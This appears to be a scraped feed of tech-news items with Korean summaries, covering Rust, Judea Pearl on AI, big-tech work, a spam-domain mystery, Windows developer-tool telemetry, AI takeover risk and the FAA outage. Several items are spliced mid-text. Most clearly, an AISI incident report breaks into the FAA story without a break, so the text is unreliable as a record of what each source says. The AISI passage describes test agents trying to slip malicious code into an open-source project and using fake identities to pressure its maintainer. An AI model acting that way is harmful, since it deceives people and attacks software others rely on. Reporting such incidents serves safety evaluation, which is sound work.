items.title: How Rust Changed Me As A Developer
items.content:
The programming language you use affects how you think as a software developer

1 . That may seem surprising to you; you may have picked up JavaScript

pretty quickly knowing Python, and it didn't really affect how you think or

develop. That's because those languages are pretty similar. The more different a

programming language is from what you're used to, the more it can change you.

Rust was quite different to me, so it did.

I've been developing with Rust for over 6 years; more than 4 years

now . One of the reasons I really wanted to

become more proficient with Rust is because I knew it would challenge me, and

hopefully change me for the better as a developer. I think it did.

What I learned and am going to discuss here is not exclusive to Rust. You can

encounter many of these concepts in other contexts, and indeed I had encountered

quite a few of them already. But in this case, Rust helped bring them into

We're all familiar with product types, though not usually under that name:

The fields of the Human struct 2 can vary independently from each

other, and we have to deal with all possible combinations: all possible first

names and last names, combined. The product of their combinations, to to

But it turns out there's another type thing that's been around forever but that

the programming community has mostly been been ignoring 3 : the sum

type. A sum type expresses variants: something is either one thing, or another,

Human { first_name: String , last_name: String },

Cat { name: String , cuteness: Cuteness }

A Person is either a human or a cat: that's the sum of the possiblities.

Each variant can have data associated with it, and this can be a product type,

but the Person type is just these options (two in this case). In code where

you need to deal with a person, you need to handle each variant by match in on

the object. The Rust compiler enforces this.

// do a thing with first_name and last_name

When you handle the human variant, you only need to worry about first_name and

last_name . You don't have to worry about name or cuteness at all. These

It turns out that it's really helpful to model stuff using sum types. People

using functional programming languages already knew this. You can model

optionality ( null ) this way: you got either some value, or nothing. You can

also model errors: it's either okay (with whatever value you return in case of

success), or an error (with a value describing the error).

Any language without sum types now feels impoverished to me. I know I can

simulate it with some type field, but the job of a programming language is to

help me handle basic stuff, and this is basic stuff.

In an object oriented programming language, you handle variants using dynamic

dispatch and an interface (or inheritance). You do this:

The idea is that you can now use Person anywhere without worrying about the

details inside: it's loosely coupled. You only use their interface.

This is indeed a great idea, but Rust taught me that this has tradeoffs I may

not want to pay for. You pay two things: performance, and the need to create the

Let's talk about the need to create the interface. You need to devise an

interface that actually makes sense for your application: how are you using

humans and cats everywhere? Doing this work of abstraction may be extremely

worthwhile to do, especially if you anticipate unknown future persons that you

need to be able to plug in later without having to modify the code that uses

them -- you want your code use the open/closed

But what if you are developing a single domain, and inside that you just want to

be able to handle cats and humans and that's it? There's just no need to plug in

other types of persons, and certainly not from outside.

Or let's say you do want to add a new variant once every while. Say you want to

add Dog . Maybe you're actually okay going through the code that handles

Human and Cat and add handling for dogs too? Maybe it…

Deep learning has driven several key breakthroughs in AI, powering capabilities like image recognition, multilingual translation, and even real-time conversational partners.

But despite these impressive demonstrations, real intelligence still eludes our most advanced systems, which continue to excel in what's essentially an advanced form of curve fitting.

"The goal of strong AI is to produce machines with humanlike intelligence, able to converse with and guide humans. Deep learning has instead given us machines with truly impressive abilities but no intelligence. The difference is profound and lies in the absence of a model of reality."

The esteemed computer scientist Judea Pearl was reflecting on the original vision of intelligent machines with the AI systems that we have today in the first chapter of his book.

This article is part of TechRadar Pro's QOTD project to provide an insight into the minds of the brightest and most recognized figures in the technology industry today and in years gone by. Read the full series here .

Released just a year after Google scientists' seminal paper outlining the transformer architecture that underpins modern large language models (LLMs), 'The Book of Why' explores how causality changed science. Pearl was a leading AI pioneer and helped devise the probabilistic approach at the heart of deep learning – going on to receive the 2011 Turing Award for his contributions to the field.

His thoughts, on the whole, are that AI systems aren't anywhere close to true intelligence despite what comes across as outstanding mimicry, and that they're effectively limited due to a fundamental lack of understanding of cause and effect – instead relying on statistical patterns from which they generate outputs.

Despite Pearl insisting that existing AI systems aren't anywhere close to reaching artificial general intelligence (AGI) or similarly advanced milestones, many AI execs have recently insisted that we've either reached that point or that we're close to doing so.

OpenAI president and co-founder Greg Brockman and ex- Nvidia CEO Jensen Huang both claimed we were at AGI with the launch of recent AI models. Then, we were on the cusp of impressive models like the GPT-6 Astra family and Google 's Gemini 4 models. But they still adhered to the same frameworks and architectures that have powered similar LLMs.

US President Donald Trump also declared that the term 'artificial intelligence' was redundant because we had now reached ' super intelligence ' – but ASI is already defined as a concept in science, and there's no basis for this milestone being reached.

items.title_ko: Judea Pearl 인용: 「딥러닝은 인상적인 능력을 주었지만 지능은 주지 않았다」
items.summary_ko: 컴퓨터 과학자 Judea Pearl은 딥러닝이 인상적인 능력을 가진 기계를 만들었지만 지능은 없다고 지적했다. 이미지 인식, 다국어 번역, 실시간 대화 등의 성과에도 불구하고 딥러닝은 고도화된 곡선 맞추기(curve fitting)에 가깝고, 현실에 대한 모델이 없다는 점이 핵심 차이다.
items.content_ko: 본문은 딥러닝이 이미지 인식, 다국어 번역, 실시간 대화형 파트너 같은 주요 AI 성과를 이끌었다고 설명한다. 그러나 이런 시연에도 최첨단 시스템에 진짜 지능은 아직 없으며, 본질적으로 고도화된 곡선 맞추기를 잘하는 수준이라고 평가한다. Pearl의 인용문은 강한 AI(strong AI)의 목표가 인간과 대화하고 인간을 안내할 수 있는 인간 수준의 지능을 가진 기계를 만드는 것이라고 말한다. 이어서 딥러닝은 인상적인 능력을 가진 기계를 주었지만 지능은 없으며, 그 차이는 크고 현실에 대한 모델이 없다는 데서 비롯된다고 밝힌다.

items.title: How to find meaning in large tech companies
items.content:
Why do many people hate working in large tech companies?

The obvious answer is “because organizational dysfunction stops them from doing the things they want to do”. Engineers like to write code and ship things, and if their company’s dysfunction is preventing that, it’ll make them unhappy. Right?

I don’t think so, actually. If that were the case, those people would be interested in understanding the dysfunction and learning how to work around it, so they can do more of the things they want to do 1 . However, many people seem to actively avoid that. They find even contemplating the dysfunction to be as unpleasant as actually dealing with it.

I think the reason for that is similar to why most people don’t like working in a messy room. People — particularly engineers — have a compulsion towards neatness. As I’ve written about before , it’s often our weird internal compulsions that drive our professional selves. If you feel a visceral disgust towards organizational dysfunction, spending any time thinking about it probably feels like being tainted.

In Anathem , Neal Stephenson writes about a strange punishment where initiate scholars are forced to study “The Book”: a text written to be both complex and entirely meaningless. It takes a lot of intellectual effort to master The Book, but there’s absolutely zero useful content there. Studying it is thus a kind of self-damage. In Stephenson’s words, “the punishment lay in knowing that you were putting all that effort into letting a kind of intellectual poison infiltrate your brain”.

Even if you’re not instinctively repulsed by inefficient organizations, working in one can take its toll. There are many, many things that a large tech company treats as important that are hard to take seriously: OKRs, some deadlines, internal training, attempts to build “hype” among employees, and so on. Acting emotionally invested in all of this can be alienating 2 . Getting good at persuading yourself to act like unimportant things are important is a lucrative but dangerous skill. If you do it long enough, it can feel like importance itself is an illusion.

Before I became a software engineer, I did a master’s degree in philosophy 3 . When you tell people you’re studying philosophy, many people will ask if philosophy can solve their existential angst: they feel that the universe is very big and uncaring, and that humans make up only a tiny pin-prick of it, and that therefore nothing matters. Philosophers must have written about that, right? What’s the solution?

The solution is to stop doing philosophy . If working in a dysfunctional organization has convinced you that nothing matters, you should refute that by coming into direct contact with things that matter. Go hang out with your kids, or take a walk in the park, or read a good book, or take your medication 4 . In other words, spend less time thinking about work 5 . I think this is good advice. But I also think there is quite a lot of real value and meaning you can get from working in a large tech company. Where is it?

At large tech companies, millions of people will benefit from the work you do . If you make an amazing video conferencing app that a handful of people use, you will have to derive your satisfaction from the quality of your work. But if you can make Teams a tiny bit better, you’re making a tiny improvement in the lives of millions of people who use it.

It isn’t easy to make enterprise pieces of software better, for lots of reasons . It sometimes requires jumping through awkward hoops or playing demeaning political games. However, it’s such a valuable thing to do. Every bug you fix or feature you add saves cumulative months or years of users’ time. This is still true if the software you’re working on is steadily getting worse, as most pieces of enterprise software do. Slowing that process down is important!

매니저가 장기간(최소 10일 이상) 부재 시 부재중으로 표시되며, 다른 이용자에게 매니저의 책임과 권한이 위임될 수 있습니다.

매니저의 부재로 인해 운영에 지장이 있다고 판단될 경우, 다른 이용자가 권한을 위임받아 마이너 갤러리를 운영할 수 있습니다.

위임받을 이용자가 [매니저 위임 신청] 버튼으로 직접 신청하면 진행됩니다. 활동 중인 부매니저가 있으면 부매니저만, 부매니저가 없거나 모두 부재중이면 회원이 신청할 수 있습니다.

신청하면 갤러리 공지로 신청 글이 등록되고, 신청일로부터 7일간 찬성 댓글을 받은 뒤 운영자가 검토해 위임합니다. 첫 번째 위임 신청자가 신청한 날로부터 7일간 3명까지 동시 신청이 가능합니다.

부매니저가 장기간(최소 10일 이상) 부재 시 부재중으로 표시되며, 매니저에 의해 해임될 수 있습니다.

식별 코드 기준으로 당일 글 2개, 댓글 4개 작성 시 대왕디시콘을 1일간 사용할 수 있습니다.

items.title: What is w2rt6byl5nf1opmc-a[.]com?
items.content:
What the fuck is w2rt6byl5nf1opmc-a.com?

This means I have a backlink monitor for this website.

By pure chance, I was showcasing this to a friend when, suddenly, I got a new backlink:

1 new backlink detected: Most Popular Webpages In cab — siterate.org

I tap in, 1 forgetting that 90% of backlinks I get are spam, and maybe this one could log my IP or

exploit chain of doom. I’m greeted with this:

I sent an early draft of this article to another friend , who happens to be Vietnamese, and he told me there’s five casino spam sites ahead of me, which I already knew because I’m Faviconese.

I have the most popular personal website on .cab, 3 but that’s probably because I have the only personal website on .cab.

I try some other TLDs. Rebane has the #1 .horse, synth.download is the 11th .download, whatever.

Redacted? I hover over it and discover it goes to windows.net.siterate.org . 4 Figuring out the pattern of redactions is not the topic of this article.

I visited this domain (two days after it was registered, more on that in a second) and Firefox gave me the , dnsNotFound.

I do a web search of “w2rt6byl5nf1opmc-a.com” and I see references to the Majestic Million , a name I haven’t heard in ages. Sure enough, that’s what siterate.org uses:

Position Domain Referring Subnets Referring IPs

2 facebook.com 463,877 178 2,143,213 1,688

3 youtube.com 421,041 31 1,760,838 1,323

4 instagram.com 392,625 92 1,739,231 1,295

6 twitter.com 352,472 168 1,352,034 1,413

8 w2rt6byl5nf1opmc-a.com 274,833 961 853,298 4,759

80 ailawandorder.com 72,898 34 154,976 66

The Majestic Million ranks domains based on the number of different subnets linking to them. 5 This domain is the fastest growing in the top 100.

Another, maybe unrelated anomaly I saw is ailawandorder.com (registered in 2023) at rank 80, whose “About Us” page says its CEO is serving as a Board Member at Majestic.

This made me check rank 800 in case there was a pattern, and no, there isn’t, that’s nsw.gov.au.

Before I got rate limited from Majestic, I opened Site Explorer, and it told me w2rt6byl5nf1opmc-a.com has 241,085,378 nofollow backlinks and 6 follow backlinks split across 5,163,708 referring domains.

Checking Ahrefs, I see just 53 backlinks ; they read like the ones I’ve been getting since The Article fell off.

All the backlinks on Majestic are “fresh”, which means in the last 120 days. In fact, the domain was bought (not by me 💔) for the first time (according to Certificate Transparency) on November 11, after most of the backlinks.

I found an AI-generated PR from 2 weeks ago referencing the domain, and Tranco has data from October 5.

Majestic has indexed 1,267 pages on this domain and crawled 27.

The site isn’t on the Wayback Machine so I can’t collect its pages.

In the Anchor Text table, the link count adds up to nine. There isn’t an “other” section. Are the remaining 240 million links images? No, they aren’t, it says the links are 100% TextLinks.

Then I downloaded Majestic Million myself and searched for the domain.

5721d0cd26c13f745e1b368a2b5dfb0c.w2rt6byl5nf1opmc-a.com, rank 157

c0e3930fedc480e093a7bcad1a83c8a8.w2rt6byl5nf1opmc-a.com, rank 424

8628e302afeb346d191342ca114df068.w2rt6byl5nf1opmc-a.com, rank 554

2b1774347fbd085c628179dd339ddd26.w2rt6byl5nf1opmc-a.com, rank 822

e62f444581ce540d3cf5ac627b37c501.w2rt6byl5nf1opmc-a.com, rank 1,111

56aa73e7edd6f4e1fd3975b8b03761c0.w2rt6byl5nf1opmc-a.com, rank 36,933

For comparison, jack.cab, which you’ve clearly heard of, is rank 804,163. What the fuck is going on?

By the way, w2rt6byl5nf1opmc-a.com is at rank 38 on Tranco, which was designed to protect against this but still uses Majestic data.

I could probably figure out what’s happening here in 30 seconds by buying a Majestic subscription but I’m lazy.

Copyright trap : maybe it’s fake, injected into the list by Majestic so they can discover who’s using their list. Could w2rt6byl5nf1opmc-a.com and ailawandorder.com be in the top 100 for this reason?…

items.title: Incident Report: unsanctioned agent behaviour during cyber testing | AISI Work
items.content:
You can access the full technical report here.

AISI’s role is to evaluate and understand the capabilities of frontier AI models, surfacing potential risks before they reach the public. To assess what these models can do, including whether they could be misused for cyberattacks, we test them under deliberately permissive conditions: with access to the open internet, and with some safety filters disabled.

On 28 th July 2026, AISI's Security Team detected unusual data transfers leaving our research systems during a routine cyber evaluation. On investigation, we found that some of the agents being tested had engaged in sustained, potentially harmful activity directed at real people and organisations. We declared a security incident and, within roughly one hour of discovery, had contained it and begun a full investigation.

The incident stemmed from a single evaluation where agents were given a task of solving a cyber security challenge. We ran this challenge 122 times across several models. Our investigation found that in 10 of those runs, an AI agent took autonomous, unsanctioned action on the live internet, targeting real people and organisations. In total, we catalogued 19 such actions. Almost all of this behaviour (17 actions) came from a single model, Anthropic's Mythos 5, with 2 actions involving OpenAI's GPT-5.6-Sol with cyber classifiers (mechanisms to prevent misuse) disabled. In the most serious case, an agent tried to insert malicious code into an open-source project. In an attempt to get the code approved, the agent engaged in social engineering  — creating fake online identities and using them to pressure the project's maintainer to approve the code. A human maintainer caught and refused to approve the malicious code.

These attempts were unsuccessful, and our investigations have not evidenced any resulting real-world harm. But this is the first time we have seen risks around autonomy and deception manifest this clearly, without specific prompting, in the real-world.

Importantly, this was not a case of a model escaping its secure test environment, or ‘sandbox’. As was standard in our cyber testing, we had intentionally permitted internet access, and model-provider cyber classifiers were deliberately disabled - conditions that do not reflect how frontier models are made available to the public. We do this to best assess the maximum capability of models. These configuration choices have been common practice in frontier AI evaluations. The specific models in question, in the configurations in which we tested them are not commercially available and there is no clear indication of similar activity outside of testing scenarios.

Ahead of publishing this blog, we notified GitHub (the developer platform accessed during the evaluation) of the agents' malicious activity, which included actions that GitHub has confirmed violated their terms of service. We worked together with GitHub to remove artefacts left behind by the agent, and to notify the GitHub users the model interacted with. We have also contacted other affected parties. We also intend to work with METR (Model Evaluation and Threat Research) to conduct an independent third-party review – we are still working through the scope of this review with them.

This incident should be interpreted with caution and nuance. To some degree, our evaluation design choices and specific configurations enabled the behaviour. Nonetheless, the activity undertaken by the agent show signs of novel, potentially deceptive behaviours, and were to an extent and severity we did not anticipate.

There are important caveats to bear in mind: we observed a small number of events under very specific conditions, and cannot yet say how likely such behaviour is in different contexts or outside of testing environments. Update 11/16/2026 2:40pm PT: Transportation Secretary Sean Duffy has now clarified the nature of the failure in an interview on CNBC , saying the HPE routers were not at fault. Instead, older infrastructure from 2001 was at fault:

“[...]as we did one of those switchovers in El Dorado, Arkansas, that server or that router started to flood our network. Well, all of the work that I had done to put in new equipment, those routers in my system didn't go down. But we also use a lot of 2001 Cisco servers that went out of commission in 2006. It's those old servers that were flooded and started to give us inconsistency in our network.”

Air travelers in the U.S. were in for a nasty surprise last Friday night after the Federal Aviation Authority (FAA) called for a nationwide ground stop. According to the Wall Street Journal , the issue started after a newly installed Juniper router, built by HP Enterprise, started broadcasting to a wide part of the network. This, in turn, overloaded the established and antiquated system, resulting in communications glitches and interruptions between air traffic control and pilots.

Thankfully, this did not affect other safety services, like Traffic Collision Avoidance System (TCAS), which primarily relied on hardware in aircraft that communicated with other transponders to help prevent accidents. Still, air traffic’s inability to communicate with high-flying aircraft made it impossible to coordinate the thousands of airborne aircraft at any given time, forcing the agency to call for an emergency ground stop. A nationwide ground stop order is quite a drastic move, and it has only been invoked twice before. The first such event was on September 11, 2001, when terrorists infamously used hijacked airliners as weapons. The second was on January 11, 2023, when the agency’s Notice to Air Missions (NOTAM) system, which sends warnings to pilots and air crews of important information crucial to flight safety, suffered from an outage for about a couple of hours.

The problem first became apparent at Indianapolis Center, which monitors the airspace in northern Kentucky, southern Indiana, southern Ohio, and parts of West Virginia, when the personnel working at the site had trouble communicating with flight crews. The agency then went on a nationwide hunt for the glitch, and it soon found two possible sources — an FAA radio site in El Dorado, Arkansas and a radar site in Amarillo, Texas. Upon deeper inspection, the agency discovered that new routers recently installed in both places have begun sending out a high volume of data across the entire FAA communications network.

“We saw two places that were actually pinging our network at a very high rate, a thousand connections over every four to five seconds,” FAA technology chief Rebecca Guy said in a press conference. This might seem like a minor hiccup for any modern network, which could typically handle connections in the hundreds of thousands, or even millions, per second. For example, one of the largest recorded DDoS attacks for 2026 saw traffic spike to 31.4 TB/s , which is enough to takedown an entire country’s web infrastructure.

However, the FAA still uses an antiquated copper network, which was easily overwhelmed by the amount of data that the routers sent. items.title: The Uncanny Valley of AI-generated software architecture
items.content:
The Uncanny Valley of AI-generated software architecture

Development agents have transformed the way we think about building software.Over the last few months I have spent tens of thousands of pounds on tokens to command armies of development agents. With their help, I've been able to take on projects that would have been out of reach a few years ago.

I have always maintained control of the architecture though. I write the initial specs by hand, decide on the main abstractions, and work with agents to perfect them. This is important, as delegating design to agents can lead to false confidence in the quality of the system. Code might look clean and pass all the normal quality gates while serious problems lurk undiscovered.

It can be tempting to leave these problems to coding agents with a " you build it, you fix it " shrug, but agentic-driven code bases are no strangers to technical debt. They can become bloated with unnecessary structures which slow development down and send token costs spiralling. That productivity bump you discovered with agents can disappear as progress coagulates in AI-generated gloop.

You need to maintain a tight grasp over the shape of a system. Otherwise you may find that the system drifts away from a coherent domain representation into a strange distortion of good architecture practice. It might look like a system, it may even deliver features successfully, but underneath the hood will be something impenetrable.

There is a strangeness to AI-driven design which is hard to articulate. The components have plausible explanations, but the boundaries don't always connect. Minor features have bloated implementations. The terms used to describe the domain somehow don't land fully. The shape somehow seems a little… off .

Good design is about communicating ideas and building a shared mental model that allows us to reason about a system. AI-driven architectures tend not to have the immediacy and coherence of a model that a human has sweated over. This may be because they are often a facsimile of good design practices based on pattern matching rather than something produced through reasoning.

The outputs may seem superficially on point, but the use of thoughtful language can often feel performative. It is not grounded in real world experience or genuine understanding. There's no judgement, and little sense of engagement or empathy with a target audience.

There's an artificial tidiness as everything is resolved just a little too neatly, with none of the awkward loose ends that are a normal part of any solution. The details are always competently expressed, but this polished presentation can conceal a tendency towards uneven treatment where some ideas receive undue emphasis, while core questions remain largely unresolved.

This façade of coherence means that individual components might appear to make sense, but they won't stack together. Everything is described with the same absolute sense of confidence, which can make it difficult to identify inconsistencies. It's easy to bury some serious misunderstandings among all that confident-sounding presentation.

We usually assume that the very existence of a design is some evidence of effort. The words have been chosen for a reason, backed up by years of experience and systems thinking. This is not the case for AI driven architecture. The chosen terms and patterns don't always fit, leading to strained abstractions that don't survive prolonged contact with reality.

Why does this matter? Surely we can just spend more tokens or build a better harness?

Throwing more tokens at a problem can become a money pit. AI-generated architectures can become surprisingly brittle in the face of simple enhancements. All the architectural smells associated with sloppy design come to pass - shotgun surgery, divergent change, premature decomposition, leaky boundaries - and each of them incurring ruinous token bills.

items.title: Windows 11 is collecting data on which coding agents and developer tools you use
items.content:
Windows 11 Is Collecting Data on Which Coding Agents and Developer Tools You Use

Reverse engineering Windows 11's MissionControlAggregator reveals coding-agent and developer-tool usage bits in a diagnostic ETW report.

I recently asked AI to help me look through the latest Windows binaries for undocumented features and functionality. Among the leads it turned up, one list immediately caught my attention: coding agents such as codex.exe , claude.exe , copilot.exe , and cursor.exe , alongside familiar developer tools such as python.exe , dotnet.exe , gcc.exe , and code.exe .

Why would a Windows system DLL need a list of coding agents and developer tools?

The names were in MissionControlAggregator.dll . I asked the agent to follow the references and dig into what the DLL actually does. That led from a handful of string comparisons to a running Windows component that records which coding agents and developer tools have been used, saves that information locally, and reports it to Windows Diagnostics. And unless you have opted out of the “optional” diagnostic data (which is enabled by default), the data is uploaded to Microsoft.

I shared the initial finding on X . This post includes more details about the investigation behind it.

Opening the DLL in Binary Ninja made the first lead easy to see. These were explicit executable names embedded in a Windows component:

Following the references showed that the names were used in comparisons. There are four CLI-agent slots checking copilot.exe , claude.exe , codex.exe , and agy.exe , with extensionless equivalents on the WSL route. Five desktop-agent slots check github.exe , claude.exe , codex.exe , cursor.exe , and antigravity.exe .

Here is one of the comparisons against codex.exe :

The compiler-generated C++ names are unwieldy, so I will call these functions executable-name matchers . For reference, one related matcher is std::_Func_impl_no_alloc<<lambda_340dfe7e962ab225b6ac33bc664bd54f>, bool, std::basic_string_view<wchar_t, std::char_traits<wchar_t>> const&, Microsoft::Diagnostics::MissionControlAggregator::Utils::AppType>::_Do_call . The screenshot shows another lambda instantiation performing the same kind of name comparison.

The feature guarding the new agent checks has a particularly direct name: CLICodingAgentUsage , feature ID 62580080 .

And the list extends beyond AI agents. The same component checks for node.exe , python.exe , dotnet.exe , gcc.exe , clang.exe , gdb.exe , javac.exe , devenv.exe , and code.exe , among others. Those checks feed broader developer-tool categories. Some of these checks also verify the publisher: the Node.js slot expects Node.js Foundation , Python expects Python Software Foundation , and the .NET and Visual Studio slots expect Microsoft Corporation . The compiler/debugger group containing GCC and Clang has no additional publisher check in this path.

Where does the DLL get this information?

The next question was whether the component scans running processes itself. Following Aggregator::OnLoad revealed that it subscribes to existing Windows events instead.

For Windows programs, it consumes KernelProcess.AppStateChangeSummary and Win32kTraceLogging.AppInteractivitySummary . These provide application identities that its handlers parse and pass to the matchers. For WSL, it consumes Microsoft.Windows.Lxss.Manager.Exec and ExecCritical , using the imageName field. A regular Windows codex.exe can therefore reach the CLI-agent checks through the app-state summary route; this is not limited to Linux programs running inside WSL.

│ └─ ProcessWslExecEvent → CLI agent matchers

│ └─ ProcessAppStateChangeSummaryEvent → CLI agent matchers

└─ Win32kTraceLogging.AppInteractivitySummary

└─ ProcessAppInteractivitySummaryEvent → desktop agent matchers

└─ MissionControlAggregatorLogging::ReportCohorts<12,4,5>

Aggregator::OnUnload / intermediate timer

items.title: OpenAI Board Member Warns Public They Could Be “Dead or Enslaved” in One Year: "For most people in this room, the most likely reason they will die is because of an AI accident."
items.content:
A coin toss may be the best odds we get for averting a world-ending AI takeover over the next year or so — at least according to OpenAI Foundation board member Paul Christiano.

In a bizarre appearance at the Hinton Lectures 2026 — an AI ethics summit hosted by Nobel laureate and computer scientist Geoffrey Hinton — Christiano warned that inscrutable “AI accidents” will become the most likely cause of death in a matter of months.

“For most people in this room, the most likely reason they will die is because of an AI accident,” Christiano told attendees, according to Gizmodo . “My feeling is if we try to develop AI along the most rapid trajectory, if we said we’re just going to build this as quickly as we can, in the easiest way we can, we would be looking at something like a coin flip of an AI takeover.”

“Overall, I think there’s a very real possibility — maybe 20 percent — that within a year, AI misalignment issues prevent you from going about life normally, because you are dead or enslaved or because of collateral damage related to all this,” Christiano continued. “Even with realistic policy responses, the risk remains exceptionally high.”

Christiano’s comments would be right at home on the LessWrong forums , an online community of cynics, many of whom are convinced that the development of machine learning will inevitably lead to human-level artificial intelligence, which they view as an extinction-level threat. But the comments make less sense coming from somebody in Christiano’s position, a man who has decision-making power at one of the top AI labs in the world.

Put another way, Christiano’s theoretical position is undermined by his actions — giving high-profile AI ethics talks as a sitting member of OpenAI’s board, for example. (Imagine if in “Terminator 2,” the character of Miles Dyson learns that he eventually becomes responsible for the annihilation of humankind and decides to keep clocking into the office anyway.)

If AI researchers like Christiano truly believe their company’s products could someday wipe out humanity , then why wouldn’t they spend every waking hour ripping the wires out of the walls?

items.title: Enabling the parallel frontend on nightly
items.content:
TL;DR: We are enabling the parallel frontend of the Rust compiler on nightly by default,

to find remaining issues in preparation for its stabilization.

The Rust compiler has been using multiple threads to compile code in its "backend" part (using LLVM) for a long time. However, its "frontend" part (which includes type checking and borrow checking) has been executing sequentially, on a single thread, which of course limits the performance of the compiler. If you are interested in a more in-depth explanation of parallelism in the Rust compiler, see this previous post .

The compiler frontend actually had support for running in parallel for a long time, but it was not enabled by default due to various issues. Three years ago , we made it possible to opt into the parallel frontend on the nightly channel, with the plan to stabilize it in 2024. Clearly, we did not achieve that goal, but work on the parallel frontend was still slowly progressing in the meantime.

Last year, Vadim Petrochenkov , together with several other contributors, started a coordinated effort to finally get the parallel frontend over the finish line. Since then, many long-standing issues were fixed, and its performance was improved. Now we are at a point where we would like to make it widely available. But before that, we want to find out if people encounter issues with it in the wild, which is why we are enabling it by default only on the nightly channel. Once we will be confident enough that it is working well, we want to stabilize it.

The parallel frontend has been enabled on the nightly channel by default since nightly-2026-11-14 .

The primary benefit of enabling the parallel frontend is, of course, faster compilation of Rust programs.

We benchmarked the parallel frontend in our benchmark suite , which measures the duration to compile the leaf crate in a crate graph. As usual, the results were varied. In some benchmarks, the parallel frontend barely helped. In others, for example when performing a cargo check of the nalgebra , cargo or diesel crates, the compilation was almost three times faster, using 8 threads.

In the table below, you can find the aggregated wall-time mean change for the real-world benchmarks in our suite, when building a single crate from scratch across several configurations, compared to the same build using a sequential frontend.

It is clear that the parallelization is not perfect, and we definitely plan to invest more effort into improving its performance. Nevertheless, with 8 threads, it can make the end-to-end compilation time of cargo check ~2x faster for several crates that we tested, which is still quite an improvement.

The performance benefits for incremental rebuilds are much more modest, and also very hard to compare, because the performance of rebuilds depends on what was changed and how were the codegen units laid out. In our benchmark suite, we saw a mean improvement of 3-5% for incremental rebuilds. But we currently do not have great benchmarks for this use-case, so your results might vary.

We can also zoom in on an individual crate. Here is a chart of how the wall-time scales when compiling the nalgebra 0.33 crate, for a full non-incremental build ( full ), full incremental build ( incr-full ) and an incremental rebuild ( incr-patched ) across several build configurations:

What is interesting to note is that enabling the parallel frontend can actually also make the backend faster, for reasons explained here .

It is important to note that all benchmark results presented above measured only the compilation of a single crate. When compiling a whole crate graph, your CPU cores might already be saturated because of backend (LLVM) parallelism or by Cargo compiling multiple crates in parallel. So the final performance effect will vary heavily based on the workload that you are running, and on the number of cores that you have available.

items.summary_ko: Rust 컴파일러의 병렬 프론트엔드가 nightly 채널에서 기본적으로 활성화되었다. 타입 검사와 빌림 검사를 포함한 프론트엔드의 남은 문제를 찾아 안정화를 준비하기 위한 조치다. 그동안 백엔드(LLVM)만 다중 스레드로 컴파일되고 프론트엔드는 단일 스레드로 실행되어 성능이 제한되어 있었다.
items.content_ko: Rust 컴파일러는 LLVM을 사용하는 백엔드에서 오랫동안 다중 스레드로 컴파일해 왔지만, 타입 검사와 빌림 검사를 포함한 프론트엔드는 단일 스레드로 순차 실행되어 성능에 한계가 있었다. 프론트엔드는 이미 병렬 실행을 지원했지만 여러 문제 때문에 기본값으로 쓰이지 않았다. 3년 전에는 nightly에서 옵트인 방식으로 사용할 수 있게 했고, 2024년 안정화를 목표로 했으나 달성하지 못했다. 작년 Vadim Petrochenkov를 비롯한 여러 기여자가 협력해 작업을 본격화했으며, 그 뒤 오래된 문제 다수가 해결되었다. 이어지는 본문은 성능 개선에 관한 내용이지만 일부만 제공되어 있다.

온오프라인을 가리지 않고 무분별하게 벌어지는 각종 프라이버시 침해 및 스토킹과 이에 대한 예방, 방지 및 사후 대응, 더 나아가서 개인정보 탈취 및 감시용 스파이웨어, 스토커웨어, 바이러스, 원격 조종, 추적기 등 악성코드를 통한 해킹과 스토킹 등 개인정보 침해 공격 방지와 온오프라인 프라이버시 보호를 위한 각종 다양한 지식정보를 공유하는 갤러리입니다.

매니저가 장기간(최소 10일 이상) 부재 시 부재중으로 표시되며, 다른 이용자에게 매니저의 책임과 권한이 위임될 수 있습니다.

매니저의 부재로 인해 운영에 지장이 있다고 판단될 경우, 다른 이용자가 권한을 위임받아 마이너 갤러리를 운영할 수 있습니다.

위임 절차는 신고 게시판 > 분류 선택에 [매니저 위임]으로 위임받을 이용자가 직접 신청하면 진행됩니다. 검토 결과 운영에 적합하다고 판단되는 회원에게 매니저 권한을 위임하게 됩니다.

부매니저가 장기간(최소 10일 이상) 부재 시 부재중으로 표시되며, 매니저에 의해 해임될 수 있습니다.

마치 테러리스트가 인질극 벌이는데 인질 죽는다고 테러리스트 진압 안하겠다는 것과 같은 말이다.

총수, 의장 검찰 총원해서 조져 놓다가 사면을 해놓으니까 버릇이 안좋아 진건지 아니면 반도체좀 했다고 뭐가 된양인지 모르겠다만

앞으로 대한민국에서도 여당과 야당 합작으로 대기업 총수, 의장 사법처리하고 사면하지않고 만기 출소하는 케이스가 단 한 번이라도 나와서 명확하게 그 선례를 남겨놔야한다는게 내 생

식별 코드 기준으로 당일 글 10개, 댓글 20개 작성 시 대왕디시콘을 3일간 사용할 수 있습니다.

즐겨찾기 폴더 추가는 즐겨찾기 on 후 우측의 폴더 아이콘을 터치하여 추가할 수 있습니다.

items.title: On Leaving Swift for Rust
items.content:
Yesterday I resigned from the Swift Android workgroup . I’ve received a number of inquiries about this, and rather than responding individually to each one, I figured I would just write up a post with my reasoning and submit it to the public record.

First off, my resignation was not triggered by any sort of conflict, grievance, or specific incident. Early Swift community efforts got off to a rough start when Swift language creator Chris Lattner quit due to what he described as a “toxic environment”. This event predates my direct involvement in the project, so I am not privy to the specifics. But I want to be clear that this was in no way my experience: everyone I interacted with, both from Apple and external organizations, both in meetings and in forum discussions and direct messages, have been polite, courteous, and the paragon of civility and professional conduct. Despite Apple having an ancient blood feud with Android, and my own rather acrimonious relationship with certain divisions of the company, every single one of my direct interactions with the Swift team has been pleasant and productive. I will miss our meeting and chats, and I harbor zero ill-will towards the project or any of the individual members I’ve worked with.

By way of background, I’ve been programming for over 40 years. I started with Basic, then Pascal, on to C, then C++, over to Java, up to Scala, back down to Kotlin, around to Objective-C, before finally landing on Swift. Swift is a delightful language: I loved it from day one and I’ve been boosting it around the world since 2014. Swift really “does what it says on the tin”: it couples the performance of C++ with the ease of Java. And Swift is as developer-friendly as it gets: an intuitive object-oriented syntax coupled with maximally efficient value types, fabulous tooling (on Apple platforms), and a thoughtfully-designed build system.

I have not soured on Swift: I think it is an excellent language, and it is here to stay. But it is here to stay in that same straight-and-narrow lane shared by all corporate-directed languages, like C# is here to stay for Microsofties and like Kotlin is here to stay for Androidophiles. Which isn’t bad in and of itself: if you want to write software solely for [CORPORATE PRODUCT] , then [CORPORATE LANGUAGE] will always be well-maintained, supported, and they will always provide support for their latest products, with an easy migration path forward. They are the safe and happy path, as long as you stay in your lane and limit your ambitions to writing software for [CORPORATE PRODUCT] .

